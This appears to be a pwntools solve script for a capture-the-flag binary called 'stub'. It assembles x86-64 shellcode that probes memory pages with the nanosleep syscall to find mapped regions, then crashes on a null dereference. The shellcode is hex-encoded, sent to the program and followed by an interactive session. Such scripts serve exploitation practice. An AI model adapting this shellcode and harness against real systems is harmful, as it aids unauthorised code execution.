from pwn import *

e = ELF("./stub")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("", )
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

pay = asm("""
  popf

  lea rax, [rip]
  add rax, 0x800

  mov r15, rax
  
  mov rdi, r15
  sub rdi, 0x2000

a:
  sub rdi, 0x1000
  
  mov rax, 35
  xor rsi, rsi
  syscall

  cmp rax, 0
  jne a

  xor rbx, rbx
  mov rbx, [rbx]
""")

goal = ""
for i in pay:
  goal += (hex(ord(i))[2:]).rjust(2, "0")

print(goal)

debug()
p.sendlineafter("code", goal)


p.interactive()
